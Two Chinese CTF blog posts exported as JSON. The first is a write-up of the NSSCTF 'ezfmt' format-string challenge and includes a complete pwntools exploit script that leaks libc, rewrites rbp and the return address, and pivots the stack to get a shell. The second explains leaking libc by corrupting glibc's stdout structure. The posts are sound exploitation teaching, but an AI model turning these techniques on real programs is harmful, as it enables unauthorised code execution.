[{"title":"NSSCTF EZFMT -- 格式化字符串栈溢出","url":"/2024/08/31/ezfmt/","content":"NSSCTF EZFMT – 格式化字符串栈溢出这道题感觉是格式化字符串使用比较全面的例子，留个档记录下。\n保护查看与静态分析Arch:     amd64-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x3ff000)\n\n\n\n程序为amd64架构，开启了NX与partial RELRO。\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  int i; // [rsp+Ch] [rbp-4h]  init_io(argc, argv, envp);  puts(&quot;Welcome to 3rd&quot;);  puts(&quot;fmt challenge&quot;);  for ( i = 0; i &lt;= 6; ++i )  &#123;    puts(&quot;&gt;&quot;);    read(0, buf, 0x100uLL);    printf(buf);  &#125;  return 0;&#125;\n\n\n\nIDA静态分析如上，发现main函数中存在格式化字符串漏洞，允许向bss段中写入0x100个字节，总计可以执行7次。\n漏洞利用printf会从栈中取参数，但我们的输入却在bss上，因此我们不能直接向栈中写入地址，因此我们考虑栈迁移到bss段。如果我们想要栈迁移，不可避免的是修改rbp，如果我们可以往栈内输入，可以直接泄露栈地址向栈中输入rbp的地址，再利用%n实现修改rbp。但我们不能向栈内写时，该如何修改栈中的数据呢。\n我们首先开始调试，将断点下在printf前，查看栈内状态。\npwndbg&gt; stack 0x3000:0000│ rsp 0x7fffffffdf68 —▸ 0x401247 (main+106) ◂— add dword ptr [rbp - 4], 101:0008│-010 0x7fffffffdf70 —▸ 0x7fffffffe070 ◂— 102:0010│-008 0x7fffffffdf78 ◂— 003:0018│ rbp 0x7fffffffdf80 ◂— 004:0020│+008 0x7fffffffdf88 —▸ 0x7ffff7df9083 (__libc_start_main+243) ◂— mov edi, eax05:0028│+010 0x7fffffffdf90 ◂— 0x50 /* &#x27;P&#x27; */06:0030│+018 0x7fffffffdf98 —▸ 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;07:0038│+020 0x7fffffffdfa0 ◂— 0x1f7fbd7a008:0040│+028 0x7fffffffdfa8 —▸ 0x4011dd (main) ◂— endbr64 09:0048│+030 0x7fffffffdfb0 —▸ 0x401260 (__libc_csu_init) ◂— endbr64 0a:0050│+038 0x7fffffffdfb8 ◂— 0x24f5fc9ff668308d0b:0058│+040 0x7fffffffdfc0 —▸ 0x4010b0 (_start) ◂— endbr64 0c:0060│+048 0x7fffffffdfc8 —▸ 0x7fffffffe070 ◂— 10d:0068│+050 0x7fffffffdfd0 ◂— 00e:0070│+058 0x7fffffffdfd8 ◂— 00f:0078│+060 0x7fffffffdfe0 ◂— 0xdb0a03604948308d10:0080│+068 0x7fffffffdfe8 ◂— 0xdb0a1320d606308d11:0088│+070 0x7fffffffdff0 ◂— 0... ↓        2 skipped14:00a0│+088 0x7fffffffe008 ◂— 115:00a8│+090 0x7fffffffe010 —▸ 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;16:00b0│+098 0x7fffffffe018 —▸ 0x7fffffffe088 —▸ 0x7fffffffe3c4 ◂— &#x27;SHELL=/bin/bash&#x27;17:00b8│+0a0 0x7fffffffe020 —▸ 0x7ffff7ffe190 ◂— 018:00c0│+0a8 0x7fffffffe028 ◂— 019:00c8│+0b0 0x7fffffffe030 ◂— 01a:00d0│+0b8 0x7fffffffe038 —▸ 0x4010b0 (_start) ◂— endbr64 1b:00d8│+0c0 0x7fffffffe040 —▸ 0x7fffffffe070 ◂— 11c:00e0│+0c8 0x7fffffffe048 ◂— 01d:00e8│+0d0 0x7fffffffe050 ◂— 01e:00f0│+0d8 0x7fffffffe058 —▸ 0x4010de (_start+46) ◂— hlt 1f:00f8│+0e0 0x7fffffffe060 —▸ 0x7fffffffe068 ◂— 0x1c20:0100│+0e8 0x7fffffffe068 ◂— 0x1c21:0108│ r13 0x7fffffffe070 ◂— 122:0110│+0f8 0x7fffffffe078 —▸ 0x7fffffffe3a7 ◂— &#x27;/home/dov3/quz/NSS/ezfmt/pwn&#x27;23:0118│+100 0x7fffffffe080 ◂— 024:0120│+108 0x7fffffffe088 —▸ 0x7fffffffe3c4 ◂— &#x27;SHELL=/bin/bash&#x27;\n\n\n\n我们可以看到，rbp + 0x18的位置 存了rbp + 0xf8的地址，而这个地址内又存了另一个栈中的地址。利用这一结构，我们就能实现对栈内的数据进行写。\n首先我们通过%n修改rbp + 0x18处的地址为我们想要修改的位置的地址，由于按页加载机制，我们只需要覆写低地址几位即可。这时rbp + 0xf8处就存了我们想要修改的地址。之后再次通过%n修改这一地址即可实现任意地址写，这道题我们则需要修改rbp与返回地址。\n这样我们可以得到一组payload，每次利用需要用掉两次输入机会。\npayload1 = (&quot;%&#123;&#125;c%11$hn&quot;.format(target)).encode()payload2 = (&quot;%&#123;&#125;c%39$hn&quot;.format(content)).encode()#其中hn仅作示例，可自由替换为n与hhn\n\n考虑到我们修改一个地址可能需要利用多次，7次的限制可能会很紧俏。但好消息是我们发现已经循环次数也存在栈中，因此我们同样可以修改这一数值。我们只需要在次数不够用时把这个值缩小即可继续进行利用。\n我们需要栈迁移的话，需要两次leave;ret，因此我们还需要修改返回地址。修改方法和上面相同。\n整体的利用流程如下\n1，泄露栈地址以及libc地址2，修改rbp与返回地址3，写入ROP执行栈迁移得到shell\n\n完整EXPfrom pwn import *from LibcSearcher import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r       = lambda num                :io.recv(num)rl      = lambda                    :io.recvline()ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b&#x27;\\x00&#x27;))uu64    = lambda data               :u64(data.ljust(8,b&#x27;\\x00&#x27;))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success(&#x27;\\033[1;31;40m%s --&gt; 0x%x \\033[0m&#x27; % (s, eval(s)))context.arch      = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;binary = &#x27;./pwn&#x27;libelf = &#x27;&#x27;if (binary!=&#x27;&#x27;): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=&#x27;&#x27;): libc = ELF(libelf)io = process(&quot;./pwn&quot;)#io = remote(&quot;node8.anna.nssctf.cn&quot;,23875)#通过格式化字符串泄露libc与栈地址payload1 = b&quot;%39$lx.%3$lx.%11$lx&quot; #read + 18  | rbp + 0x118ru(b&quot;&gt;\\n&quot;)sl(payload1)aim = int(ru(b&quot;.&quot;),16)ls(hex(aim))libc_read = int(ru(b&quot;.&quot;),16)-18rbp = int(ru(b&quot;\\n&quot;,),16) - 0x118 +0x20ls(hex(libc_read))ls(hex(rbp))libc = LibcSearcher(&quot;read&quot;,libc_read)libc_base = libc_read - libc.dump(&quot;read&quot;)one_gadget = libc_base + 0xe3afebin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)rdi_ret = 0x4012c3r12_13_14_15 = 0x4012bcls(hex(libc_base))#修改rbp为bss上地址a = rbp &amp; 0xffffls(hex(a))payload2 = (&quot;%&#123;&#125;c%11$hn&quot;.format(a)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload2)b = 0x4088payload3 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)#gdb.attach(io)sl(payload3)c = a+2ls(hex(c))payload4 = (&quot;%&#123;&#125;c%11$hn&quot;.format(c)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload4)b = 0x40payload5 = (&quot;%&#123;&#125;c%39$hhn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改次数判断的部分，增加利用次数d = a-4ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)payload5 = (&quot;%39$hhn&quot;).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改返回地址为leave;ret,这里修改了末4字节d = a+8ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x1256payload5 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)d = a+10ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x40payload5 = (&quot;%&#123;&#125;c%39$hn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#修改次数判断的部分，增加利用次数d = a-4ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)b = 0x3payload5 = (&quot;%&#123;&#125;c%39$hhn&quot;.format(b)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#继续修改返回地址，这里修改首4字节d = a+12ls(hex(d))payload6 = (&quot;%&#123;&#125;c%11$hn&quot;.format(d)).encode()ru(b&quot;&gt;\\n&quot;)sl(payload6)payload5 = (&quot;%39$n&quot;).encode()ru(b&quot;&gt;\\n&quot;)sl(payload5)#写入ROP栈迁移到bss执行onegadgetpayload6 = p64(rbp)+p64(rbp)+p64(rdi_ret)+p64(bin_sh)+p64(r12_13_14_15)+ p64(0)*4 +p64(one_gadget)ru(b&quot;&gt;\\n&quot;)#gdb.attach(io)sl(payload6)itr()\n\n后记一开始尝试使用system拿到shell，但尝试后发现system会向rsp-0x300左右的一个位置写，这里没有权限导致无法执行。最后换成了one_gadget才得以执行\n","categories":["pwn WriteUp"],"tags":["格式化字符串"]},{"title":"利用_IO_2_1_stdout泄露libc","url":"/2024/09/01/stdout_libc/","content":"_IO_2_1_stdout泄露libc利用方法利用方法比较简单，首先要想办法可以修改stdout处的内存，部分结构体如下:\nstruct _IO_FILE&#123;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */  /* The following pointers correspond to the C++ streambuf protocol. */  char *_IO_read_ptr;\t/* Current read pointer */  char *_IO_read_end;\t/* End of get area. */  char *_IO_read_base;\t/* Start of putback+get area. */  char *_IO_write_base;\t/* Start of put area. */  char *_IO_write_ptr;\t/* Current put pointer. */\n\n我们整体的修改内容如下，修改_flag为0xFBAD1800，将之后24个字节置零即_IO_read_ptr,_IO_read_end,_IO_read_base这三个8字节的地址置为0。\n之后的_IO_write_base与_IO_write_ptr分别为我们想要泄露的地址的起止点。之后我们不需要去管参数问题，只要有puts函数执行即可打印出我们想要泄露的信息。\n利用原理我们来看为什么这样做可以达到泄露libc的目的，先来看put函数的调用链，puts函数在源码中的形式为_IO_puts，\nputs -&gt; _IO_sputn -&gt; _IO_new_file_xsputnint_IO_fputs (const char *str, FILE *fp)&#123;  size_t len = strlen (str);  int result = EOF;  CHECK_FILE (fp, EOF);  _IO_acquire_lock (fp);  if ((_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)      &amp;&amp; _IO_sputn (fp, str, len) == len)    result = 1;  _IO_release_lock (fp);  return result;&#125;\n\n我们可以发现其中调用了_IO_sputn函数，它是一个宏，它调用了_IO_2_1_stdout中虚表所指向的_xsputn，即_IO_new_file_xsputn函数。\n_IO_new_file_xsputn -&gt; _IO_new_file_overflow在_IO_new_file_xsputn函数中大概做了如下的内容，由_IO_write_end - _IO_write_base去计算缓冲区还有多少空间。\n经过上述最后一步的判断，如果还有剩余则说明输出缓冲区未建立或者空间已满，那么就需要通过_IO_OVERFLOW函数来建立或清空缓冲区，这个函数主要是实现刷新缓冲区或建立缓冲区的功能。在vtable中为_IO_new_file_overflow。\nint_IO_new_file_overflow (FILE *f, int ch)&#123;  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */    &#123;      f-&gt;_flags |= _IO_ERR_SEEN;      __set_errno (EBADF);      return EOF;    &#125;  /* If currently reading or no buffer allocated. */  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)    &#123;      /* Allocate a buffer if needed. */      if (f-&gt;_IO_write_base == NULL)\t&#123;\t  _IO_doallocbuf (f);\t  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);\t&#125;      /* Otherwise must be currently reading.\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\t logically slide the buffer forwards one block (by setting the\t read pointers to all point at the beginning of the block).  This\t makes room for subsequent output.\t Otherwise, set the read pointers to _IO_read_end (leaving that\t alone, so it can continue to correspond to the external position). */      if (__glibc_unlikely (_IO_in_backup (f)))\t&#123;\t  size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;\t  _IO_free_backup_area (f);\t  f-&gt;_IO_read_base -= MIN (nbackup,\t\t\t\t   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);\t  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;\t&#125;      if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)\tf-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\tf-&gt;_IO_write_end = f-&gt;_IO_write_ptr;    &#125;  if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n上述源码很长，我们重点摘出其中几行进行分析\nif (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)if (ch == EOF)    return _IO_do_write (f, f-&gt;_IO_write_base,\t\t\t f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n\n其中前两个为我们需要绕过的条件判断，第三个是我们需要利用的函数。\n第一个判断若为真会直接返回，故第一个条件判断我们应控制其为假。\n第二个判断用于检查输出缓冲区是否为空，如果为空则进行分配空间，并且会初始化指针。会导致我们写入的_IO_write_base不可控。因此我们也需要让这个判断为假。\n这里我们会频繁的看到_flags这一参数。接下来浅做一个介绍。\n_flag是一个4字节的变量他的前两个字节由libc固定，通常为0xfbad0000，不同libc可能存在差异。而末两字节则用于根据规则决定程序的执行状态。后续执行流程中正如刚才给出的两个条件判断，他会与定义的一些常量进行按位与运算，判断接下来如何执行。\n我们先暂时不介绍每个数值的意义，继续看之前提到的绕过。\nif (f-&gt;_flags &amp; _IO_NO_WRITES)\n\n_IO_NO_WRITES这一不可写常量为8，我们需要这一部分为假，0xfbad0000即可满足条件。\nif ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)\n\n_IO_NO_WRITES这一不可写常量定义为0x800，这里是或判断，我们需要让两部分均为假，f-&gt;_IO_write_base中填入的是泄露数据的起始地址，很显然不为空。后半自然假。前一半我们则需要让(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)!=0,由此我们填入的_flag应为0xfbad0800。\n_IO_do_write -&gt; _IO_new_do_write -&gt; new_do_write至此我们成功进入了_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);函数，而这一函数会进入_IO_new_do_write这一函数。\nint_IO_new_do_write (FILE *fp, const char *data, size_t to_do)&#123;  return (to_do == 0\t  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;&#125;libc_hidden_ver (_IO_new_do_write, _IO_do_write)\n\n\n\n这个函数没做太多操作，而是调用了 new_do_write函数，这一函数与我们 _IO_new_do_write 函数参数完全一致。\nnew_do_write new_do_write函数中包含有我们接下来需要做的其他绕过，\nstatic size_tnew_do_write (FILE *fp, const char *data, size_t to_do)&#123;  size_t count;  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;  count = _IO_SYSWRITE (fp, data, to_do);  if (fp-&gt;_cur_column &amp;&amp; count)    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\t\t       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\t\t       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);  return count;&#125;\n\n这里我们就可以看到我们的最终目标\ncount = _IO_SYSWRITE (fp, data, to_do);\n\n而上面则是一组条件判断\nif (fp-&gt;_flags &amp; _IO_IS_APPENDING)    /* On a system without a proper O_APPEND implementation,       you would need to sys_seek(0, SEEK_END) here, but is       not needed nor desirable for Unix- or Posix-like systems.       Instead, just indicate that offset (before and after) is       unpredictable. */    fp-&gt;_offset = _IO_pos_BAD;  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)    &#123;      off64_t new_pos\t= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);      if (new_pos == _IO_pos_BAD)\treturn 0;      fp-&gt;_offset = new_pos;    &#125;\n\n第一个判断为真则会对fp-&gt;_offset赋值，这一操作对我们的后续利用没有任何影响。而第二个判断中带有执行_IO_SYSSEEK，即lseek函数，\noff_t lseek(int filedes, off_t offset, int whence) ;\n\n这一函数用于控制在文件操作时的文件偏移量。而这里我们的偏移量为fp-&gt;_IO_write_base - fp-&gt;_IO_read_end 如果我们的fp-&gt;_IO_read_end很小，必然会导致执行出错。\n那可能有同学要问，我们为什么不绕过这两个判断，让fp-&gt;_IO_read_end == fp-&gt;_IO_write_base，这一操作原理上是可行的，但我们通常选择覆写fp-&gt;_IO_write_base的低8bit为0。接下来会给出一段stdout中的内存。\npwndbg&gt; x/30gx stdout0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;:\t\t0x00000000fbad2887\t0x00007ffff7e1b8030x7ffff7e1b790 &lt;_IO_2_1_stdout_+16&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7a0 &lt;_IO_2_1_stdout_+32&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7b0 &lt;_IO_2_1_stdout_+48&gt;:\t0x00007ffff7e1b803\t0x00007ffff7e1b8030x7ffff7e1b7c0 &lt;_IO_2_1_stdout_+64&gt;:\t0x00007ffff7e1b804\t0x00000000000000000x7ffff7e1b7d0 &lt;_IO_2_1_stdout_+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7e1b7e0 &lt;_IO_2_1_stdout_+96&gt;:\t0x0000000000000000\t0x00007ffff7e1aaa00x7ffff7e1b7f0 &lt;_IO_2_1_stdout_+112&gt;:\t0x0000000000000001\t0xffffffffffffffff0x7ffff7e1b800 &lt;_IO_2_1_stdout_+128&gt;:\t0x000000000a000000\t0x00007ffff7e1ca700x7ffff7e1b810 &lt;_IO_2_1_stdout_+144&gt;:\t0xffffffffffffffff\t0x00000000000000000x7ffff7e1b820 &lt;_IO_2_1_stdout_+160&gt;:\t0x00007ffff7e1a9a0\t0x00000000000000000x7ffff7e1b830 &lt;_IO_2_1_stdout_+176&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7e1b840 &lt;_IO_2_1_stdout_+192&gt;:\t0x00000000ffffffff\t0x00000000000000000x7ffff7e1b850 &lt;_IO_2_1_stdout_+208&gt;:\t0x0000000000000000\t0x00007ffff7e176000x7ffff7e1b860:\t0x00007ffff7e1b6a0\t0x00007ffff7e1b780\n\n如果我们将_IO_write_base的低8bit写为0，这样由于输出的起始地址变小了，所以会打印很多内容。从中即可找出我们要的libc地址。\n如果题目开启了随机化保护(PIE),我们可能就无法写入一个有效的地址，更不可能让fp-&gt;_IO_read_end == fp-&gt;_IO_write_base。\n综上所述，更好的选择往往是直接进入第一个条件判断，由此避免执行else if的部分。即fp-&gt;_flags &amp; _IO_IS_APPENDING应为真。\n_IO_IS_APPENDING这一常量为0x1000,这时我们的_flag变为了0xfbad1800。\n由此我们就能到达_IO_SYSWRITE系统调用，泄露出libc地址。\n总结前面写的内容比较多，但整体在讲的都是调用链和如何绕过。实际操作时则比较简单。我们可以直接修改_flag为0xFBAD1800，将之后24个字节置零即_IO_read_ptr,_IO_read_end,_IO_read_base这三个8字节的地址置为0。再多输入2个字节的0x0就能完成利用，通常甚至无需考虑 _IO_write_ptr。\n","categories":["pwn 利用方法"],"tags":["信息泄露"]}]